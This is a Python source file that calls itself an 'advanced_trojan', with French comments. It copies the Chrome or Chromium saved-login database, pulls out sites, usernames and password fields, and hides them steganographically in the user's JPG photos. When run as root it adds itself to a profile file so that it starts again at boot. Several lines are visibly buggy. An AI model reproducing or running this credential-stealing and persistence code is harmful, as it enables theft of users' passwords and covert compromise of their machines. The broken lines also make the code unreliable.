import glob
from os import path, geteuid, remove
import stepic
from PIL import Image
from datetime import datetime, timedelta
import sys
from time import sleep
import re
import sqlite3 as sql
from shutil import copy


# Fonction qui encode un message dans une image (stéganographie)
def encode(filePath, mess):
    img = Image.open(filePath)
    stegImg = stepic.encode(img, mess)
    stegImg.save(filePath, 'PNG')


# Fonction qui decode un message dans une image
def decode(filePath):
    img = Image.open(filePath)
    mess = stepic.decode(img)
    return mess


# Fonction pour formater le message
def formatMsg(entry):
    msg = str(entry[2].__len__()).zfill(2) + entry[2] + entry[0] + "@" + entry[1] + "#"
    return msg


# Fonction qui vérifie si le message est valide
def isValidFormat(entry):
    if (entry[0] == '0' or entry[0] == '1') and ('0' <= entry[1] <= '9'):
        return True
    else:
        return False


# Fonction qui déchiffre les mots de passe venant du navigateur
def decryptPasswords():
    msgList = []
    try:
        chromePath = path.expanduser("~/.config/google-chrome/Default/Login Data")
        if not path.exists(chromePath):
            chromePath = path.expanduser("~/.config/chromium/Default/Login Data")
        tempPath = "/tmp/Login Data"
        copy(chromePath, tempPath)
        db = sql.connect(tempPath)
        cur = db.cursor()
        cur = db.execute('select origin_url, username_value, password_value from logins;')
        savedList = []
        rows = cur.fetchall()

        for row in rows:
            print(row)
            savedList.append([str(row[1]), str(row[0]), str(row[2])])  # username, domain name, password
        for entry in savedList:
            msgList.append(formatMsg(entry))
        remove(tempPath)

    except Exception as e:
        print(e)
        pass
    print(msgList)
    return msgList


# Fonction qui dechiffre le mot de passe d'ancien navigateur
def decrytpPassword2():
    chromePath = path.expanduser("~/.config/google-chrome/Default/Login Data")
    try:
        f = open(chromePath, 'r')
        lines = []
        s = ""
        while True:
            c = f.read(1)
            if not c:
                break
            elif ' ' <= c <= '~':
                s += c
                print(c)
            elif c == '\n':
                lines.append(s)
                s = ""
        f.close()
        r = re / compile('/')
        l1 = r.split(lines[1])
        l2 = r.split(lines[2])

        i = 1
        x = []
        while 5 + (i - 1) * 9 < l1.__len__():
            x.append(l1[5 + (i - 1) * 9])  # Hostname
            x.append(l1[6 + (i - 1) * 9])
            i += 1

        i = 1
        y = []
        while 3 + (i - 1) * 6 < l2.__len__():
            y.append(l2[3 + (i - 1) * 6])
            i += 1

        i = 1
        savedList = []
        while 2 * (i - 1) < x.__len__():
            hostname = x[2 * (i - 1)]
            s1 = x[2 * (i - 1) + 1]
            s2 = y[i - 1]

            j = 0
            for j in range(0, 1000):
                if s1[j:j + 5].lower() == 'email':
                    break

            s1 = s1[j:]
            for j in range(0, 1000):
                if s2[j:j + 5] == 'email':
                    break
            s2 = s2[j:]

            for j in range(0, 1000):
                if s2[j] != s1[j]:
                    break

            s3 = s1[j:]
            s4 = s2[j:]
            password = s3[:-len(s4)]
            s2 = s2[5:]
            j = len(s2)
            while j >= 0:
                j = j - 1
                if s2[j].lower() == 'p':
                    break
            username = s2[:j]
            savedList.append([username, hostname, password])
            i += 1
    except:
        pass

    msgList = []
    for entry in savedList:
        msgList.append(formatMsg(entry))

    return msgList


# Fonction qui initialise le premier lancement
def firstRun():
    msgList = decryptPasswords()  # List of browser saved passwords
    numOfMsgs = msgList.__len__()
    i = -1
    encodeDir = path.expanduser("~/Pictures/")
    numOfFiles = 0

    if numOfMsgs > 0:
        for infile in glob.glob(encodeDir + "*.jpg"):
            i = (i + 1) % numOfMsgs
            encode(infile, msgList[i])
            numOfFiles += 1

        f = open('/tmp/bootup.cfg', 'w+')
        numEncoded = min(numOfMsgs, numOfFiles)
        f.write(str(numEncoded) + '\n')
        f.write("1950-01-01 00:00:00")
        f.close()
        for infile in glob.glob(encodeDir + "*.jpg"):
            print("--> ENCODED RUN : ", decode(infile))
    if geteuid() == 0:
        try:
            f = open('../profile', 'a')
            f.write("sudo python advanced_trojan.py&")
            f.close()
        except:
            pass


# Fonction pour encoder les démarrage successif
def encodeRun(decodedMsgList, updateDt):
    browserMsgList = decryptPasswords()
    msgList = browserMsgList + decodedMsgList
    numOfMsgs = msgList
    i = -1
    encodeDir = path.expanduser("~/Pictures/")
    numOfFiles = 0

    if numOfMsgs > 0:
        for infile in glob.glob(encodeDir + "*.jpg"):
            i = (i + 1) % numOfMsgs
            encode(infile, msgList[i])
            numOfFiles += 1
        f = open('/tmp/bootup.cfg', 'w+')
        numEncoded = min(numOfMsgs, numOfFiles)
        f.write(str(numEncoded) + '\n')
        f.write(updateDt.strftime("%Y-%m-%d %H:%M:%S"))
        f.close()
    return numEncoded


# Fonction principale
def advanced_trojan():
    while True:
        if not path.exists('/tmp/bootup.cfg'):
            firstRun()

        try:
            update_dt
        except NameError:
            update_dt = None

        if update_dt is None:
            f = open('/tmp/bootup.cfg', 'r')
            try:
                numEncoded = int(f.readline())
            except:
                numOfMessages = 0
            update_dtline = f.readline()
            f.close()
            update_dt = datetime.strptime(update_dtline, "%Y-%m-%d %H:%M:%S")
            encodeDir = path.expanduser("~/Pictures/")
            decodeDir = path.expanduser("~/Downloads/")
            encodeflg = 0
            msgList = []
            for infile in glob.glob(decodeDir+"*.png"):
                print(decode(infile))
                file_cdt = datetime.fromtimestamp(path.getctime(infile))
                if file_cdt - update_dt > timedelta(0):
                    msg = decode(infile)
                    if isValidFormat(msg):
                        print( "*** DOWNLOADS *** ", msg)
                        if msg not in msgList:
                            msgList.append(msg)
                            encodeflg = 1
            print("Update time: ", update_dt)
            f = open('/tmp/bootup.cfg', 'w+')
            f.write(str(numEncoded)+"\n")
            update_dt = datetime.now()
            f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            f.close()
            if encodeflg == 1:
                numEncoded = encodeRun(msgList, update_dt)
        sleep(10)


if __name__ == "__main__":
    advanced_trojan()
